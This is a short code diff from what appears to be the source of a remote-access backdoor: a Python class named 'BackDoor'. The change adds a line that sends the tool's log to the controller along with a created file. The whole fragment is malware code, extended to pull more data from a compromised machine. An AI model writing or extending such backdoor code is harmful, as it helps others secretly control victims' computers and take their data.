@@ -444,6 +444,7 @@ class BackDoor:
             time.sleep(0.5)
             # Send created file
             self.prepare_data(file)
+            self.prepare_data(self.log)
         else:
             print("Not exist, my man")
 
